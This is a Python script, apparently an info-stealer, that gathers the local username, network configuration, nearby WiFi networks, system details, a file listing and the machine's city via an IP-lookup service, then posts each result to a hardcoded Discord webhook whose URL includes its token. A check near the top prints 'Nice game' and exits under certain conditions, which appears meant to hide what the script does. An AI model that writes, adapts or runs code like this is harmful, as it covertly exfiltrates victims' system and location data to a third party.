import subprocess
import requests
import platform
import os
import sys

# Check if script is opened in a text editor (basic deterrent)
if len(sys.argv) == 1 and 'EDITOR' not in os.environ and 'VISUAL' not in os.environ and not sys.stdin.isatty():
    print("Nice game")
    sys.exit(0)

print("Script starting...")  # Confirm launch

WEBHOOK_URL = "https://discord.com/api/webhooks/1424039275544186910/M_rXetcU48xl1xwhdCbDpkdb_bw1uhit-skU58IsRkPKSWXONN3HDOIEiM1KNCbq9bhX"  # Replace with your actual webhook URL

commands = {
    "Get Username": "whoami" if platform.system() != "Windows" else "echo %USERNAME%",
    "Get IP Config": "ipconfig" if platform.system() == "Windows" else "ip addr",
    "Get WiFi Networks": "iwconfig" if platform.system() != "Windows" else "netsh wlan show networks",
    "System Info": "systeminfo" if platform.system() == "Windows" else "uname -a",
    "List Files": "ls -la" if platform.system() != "Windows" else "dir",
    "Location": "echo Getting location via IP...",  # Placeholder for API call
}

def run_command(cmd):
    try:
        print(f"Running command: {cmd}")
        if title == "Location":
            # Use ipinfo.io API to get city based on public IP
            response = requests.get("https://ipinfo.io/json", timeout=10)
            response.raise_for_status()
            data = response.json()
            city = data.get("city", "Unknown city")
            return f"City: {city}"
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                if "not recognized" in result.stderr.lower() or "command not found" in result.stderr.lower():
                    return f"Error: Command '{cmd}' not available on this system."
                elif "permission denied" in result.stderr.lower() or "access is denied" in result.stderr.lower():
                    return "Error: Command requires elevated privileges. Run as Administrator or with sudo."
                return f"Error: {result.stderr}"
            
            output = result.stdout.strip()
            if not output and title == "Get Username":
                # Fallback to environment variable if command fails
                env_user = os.getenv("USER") if platform.system() != "Windows" else os.getenv("USERNAME")
                return env_user or "Error: Could not retrieve username."
            
            return output
    except Exception as e:
        return f"Error: {str(e)}"

def discord(title, content):
    try:
        print(f"Sending to Discord: {title}")
        data = {"embeds": [{"title": title, "description": f"```{content[:1990]}```", "color": 16711680}]}
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        response.raise_for_status()
        print(f"Sent: {title}")
        return True
    except Exception as e:
        print(f"Discord error: {str(e)}")
        return False

try:
    print(f"System: {platform.system()}")
    for title, cmd in commands.items():
        print(f"Processing {title}")
        output = run_command(cmd)
        discord(title, output)
except Exception as e:
    print(f"Critical error: {str(e)}")